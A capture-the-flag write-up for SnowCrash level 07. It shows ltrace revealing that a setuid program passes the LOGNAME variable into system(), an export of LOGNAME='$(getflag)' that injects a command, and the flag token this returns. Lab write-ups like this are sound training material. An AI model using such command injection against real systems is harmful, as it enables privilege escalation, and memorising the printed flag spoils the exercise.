# Level 07

## Solution Steps

1. First, when we switch to level07 user and run the file, we get a simple output:
```bash
level07@SnowCrash:~$ ./level07
level07
```

2. We use `ltrace` to analyze the program:
```bash
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff854, 0x80485b0, 0x8048620 <unfinished ...>
getegid() = 2007
geteuid() = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
getenv("LOGNAME") = "level07"
asprintf(0xbffff7a4, 0x8048688, 0xbffff7c, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07")
```

3. From the `ltrace` output, we can see that the program reads the `LOGNAME` environment variable and prints its content.

4. We exploit this vulnerability by changing the `LOGNAME` variable with command injection:
```bash
level07@SnowCrash:~$ export LOGNAME='$(getflag)'
level07@SnowCrash:~$ ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## Flag
```
fiumuikeil55xe9cu4dood66h
```